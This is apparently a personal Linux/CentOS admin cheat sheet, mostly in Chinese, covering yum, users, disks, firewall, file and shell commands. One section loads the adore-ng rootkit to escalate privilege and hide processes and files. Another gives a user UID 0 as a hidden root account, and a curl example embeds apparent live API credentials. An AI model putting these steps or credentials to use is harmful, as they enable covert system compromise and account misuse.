
# yum

  ```
    yum history
    
    卸载
    yum history undo <ID>
    
    yum-utils upgrade
    
    yum update && yum install yum-utils
  ```
  
# common

    - 上一次shell脚本执行结果 0 表示成功 1 表示失败
    
        echo $?
        
    - install
    
        ./configure
        make && make install
        
    - privilege
    
        查看当前登录系统的用户名
        whoami 
    
        查看用户权限
        id username
        
        增加用户后授权root用户
        useradd cd
        echo 123456 --stdin cd #创建用户
        vim /etc/password  #修改密码
        改： root:x:0:0:root:/root:/bin/bash
        为： root:x:0:0:root:/sbin/nologin #不让root登录
        改：cd:x:5000:500::/home/cd:/bin/bash
        为：cd:x:0:0::/home/cd:/bin/bash #改ID500为0，cd就成为root身份
        
        增加用户和设置密码
        useradd mk
        echo 123456 | passwd --stdin mk
        
        adduser tony
        password tony
        usermod -aG wheel username
        
        - [add user](https://www.digitalocean.com/community/tutorials/how-to-create-a-sudo-user-on-centos-quickstart )
  
# performance

  - process
  
        ```
        to kill process with pid file
        kill `cat /mysql-data-directory/host_name.pid
        ```

  - cup
  
        ```
        top
        sudo ls -l /proc/PID/exe
        ps -ef|grep ****
        ps p 3036 -L -o pcpu,pid,tid,time,tname,cmd
        printf "%x\n"  3046
        jstack -l pid | grep tid的十六进制值 
        ```
    
   - storage
   
        ```
        df -ah

        du -h --max-depth=1 /
        
        fdisk 创建一个新的分区
        fdish /dev/sda

        partx 获得新的分区列表
        partx -a /dev/sda 

        使用新的分区
        mkdir /temp/sda
        mkfs mkfs.ext4 /dev/sda
        mount /dev/sda /tmp/sda
        ```
        
   - file system
   
       ```
         view open file uppor bound
         
            ulimit -a 
            
         update open files uppor bound
 
            ulimit -n

          show opening files with proccess identity

            lsof -p process-id
            
         
         
       
       ```
       
  
# find

  ```
    sudo find / -iname "gitlab"
  ```

# iptabls 

        centos7
        firewall-cmd --add-port=2181/tcp --permanent
        systemctl enable firewalld
        systemctl start firewalld
        systemctl status firewalld

# chmod

  - 赋予执行权限
    
        chmod +x ./xxx.sh
# chown  

  - 所有者 
  
        chwon user:group /dirpath

# history
    
    - 快速查找历史命令
        
        Ctrl+R > 输入要查找的关键字 > 按下左右方向键

# network

  - 获得外网IP
    
        curl members.3322.org/dyndns/getip
        #查公网ip
        curl ifconfig.me
        curl icanhazip.com

  - 查找ip路由
   
        traceroute ifconfig.me
	
  - firewall

     ```
     systemctl disable firewalld
	 systemctl stop firewalld
	 
	 sudo firewall-cmd --add-port=2376/tcp --permanent \
	 && sudo firewall-cmd --add-port=2377/tcp --permanent \
	 && sudo firewall-cmd --add-port=7946/tcp --permanent \
	 && sudo firewall-cmd --add-port=7946/udp --permanent \
	 && sudo firewall-cmd --add-port=4789/udp --permanent \
	 && sudo firewall-cmd --reload \
	 && sudo systemctl restart docker
     ```	 

# search
 
  - searching in zip file
    
        zcat 1.txt.tgz | grep "xxxx"
  
  - find words in multiple files

        grep -E 'fatal|error|critical|failure|warning' *.log
    
  - to check what is the difference between two files.

        diff -u
    
   - 查询被前一天到现在被修改的文件
   
        find /etc/init.d/ -mtime -1
    
    - 树状显示目录接口
    
        tree /filepath
    
# file operation

  - filter space line
   
        # 过滤空行 -v 表示取反 ^$ 表示空行
        grep -v ^$  /filepath/filname
  
 
  - create an empty file

        touch /filepath/filename
    
   - zip 

        tar czvf kafka_2017-07-07.tar.gz server.log.2017-07-07-01 controller.log.2017-07-07-02 
    
   - unzip
   
        tar xzvf kafka_2017-07-07.tar.gz
    
    - undelete
    
        使用extundelete恢复误删除的文件
        extundelete /filepath/filename --restore-inode 12
        extundelete /filepath/filename --restore-file filename
        extundelete /filepath --restore-directory /filepath
        
     - monitor change in directory
     
        使用inotify 实现对目录修改的监控
        -e 用来指定要监控哪些事件，事件包括 创建 移动 删除 修改文件内容 修改文件属性
        -m 表示持续监控 
        -r 表示递归整个目录
        -q 表示简化输出信息
        inotifywait -h
        
      - look content
      
         cat /filepath/filename
         
      - copy 
      
        cp /src_file_path/src_file_name /dest_file_path/dest_file_name
        cp -r /src_dir  /dest_dir
        
      - delete file
      
        rm -rf /filepath
        
      - list the files
      
            查看文件inode号
            ls -i /filepath/filename 
            
            参看文件inode内容
            stat /filepath/filename
            
       - chattr 修改文件属性 
            chattr +i shell.sh  #使得shell.sh不能删除
            lsattr filename  #使得查看文件属性
            chatter -i shell.sh #使得shell.sh恢复成可删除状态

# http

   - curl
    curl --insecure -X POST -v https://api.jpush.cn/v3/push -H "Content-Type: application/json" -u "6fcdb3b7bd5b503707e6eced:2347b24d5aad8743ffd97903" -d '{"platform":"all","audience":"all","notification":{"alert":"Hi,JPush !","android":{"extras":{"android-key1":"android-value1"}},"ios":{"sound":"sound.caf","badge":"+1","extras":{"ios-key1":"ios-value1"}}}}'


# security

    - Generate a private key (RS256: RSASSA + SHA256)
        openssl genpkey -algorithm RSA -out private_key.pem -pkeyopt rsa_keygen_bits:2048
        # Derive the public key from the private key (RS256: RSASSA + SHA256)
        openssl rsa -pubout -in private_key.pem -out public_key.pem

        # Generate a private key (ES256: ECDSA using P-256 and SHA-256)
        openssl ecparam -name prime256v1 -genkey -noout -out ecdsa_private_key.pem
        # Derive the public key from the private key
        openssl ec -in ecdsa_private_key.pem -pubout -out ecdsa_public_key.pem

    - hybrid-encryption

        gpg 

# fail2ban 可以监控系统日志然后匹配日志的错误信息执行相应的屏蔽动作卡松email，sshd的系统日志/var/log/secure
    vim /etc/fail2ban/jail.conf
    logpath = /var/log/secure
    findtime = 300 #时间范围300秒
    maxretry = 3   # 3次使用ssh尝试后失败
    bantime = 3600 #阻止3600秒

# env 查询环境变量

# shell脚本中的双引号和单一好单引号的区别：赋值时没有区别 引用时存在区别,shell赋值时不允许有空格
    x=alphago
    echo "$x"
    echo '$x'

# 如何运行shell脚本
    - 使用绝对路径
    - 使用相对路径 ./
    - sh 脚本名  不需要执行权限
    - .(空格)脚本名称 不需要执行权限
    - source 脚本名称 不需要执行权限 主要用户生效配置文件
    - /bin/bash

# 使用script进行脚本执行录制
    script -t 2>timeing.log -a output.session
    exit
    scriptreplay timing.long output.session

# 通过rootkit隐藏行踪
    adore-ng http://github.com/trimpsyw/adore-ng
    make && insmod adore-ng.ko
    ./ava r [提权的命令 vim /etc/shadow]
    ./ava i [隐藏的pid]
    ../ava h [隐藏文件] 

# 防DDos攻击
    #!/bin/bash
    netstat -ntu | awk '{print $5}'| cut -d: -f1|sort|uniq -c|sort -n
    sudo netstat -antup|grep 80

# gitlab

    gitlab-ctl start
    gitlab-ctl stop
    gitlab-ctl restart
	
# ntpdate

  ```
  ntpdate ntp1.aliyun.com	
  ```
  
# running backup process without nohup

  nohup command </dev/null >/dev/null 2>&1 & # completely detached from terminal
  - [nohup without nohup.out](https://stackoverflow.com/questions/10408816/how-do-i-use-the-nohup-command-without-getting-nohup-out)
  
# add DNS

   ```
   vi /etc/resolv.conf
   
  nameserver 8.8.8.8 
   
   
   ```
   
 # extract some lines from one file to the new file
 
  ```
    sed -n '16224,16482 p' orig-data-file > new-file
  ```
  
# stat the summary number of lines of the file

  ```
    wc -l log.log
  ```  
 
   
# reference

  - [Expand a Hard Disk with Ubuntu LVM](https://www.geoffstratton.com/expand-hard-disk-ubuntu-lvm)
  
# issues

  - [centos One of the configured repositories failed](https://stackoverflow.com/questions/32524675/centos-7-1-error-repository)
  - [Could not resolve host: mirrorlist.centos.org Centos 7](https://serverfault.com/questions/904304/could-not-resolve-host-mirrorlist-centos-org-centos-7)
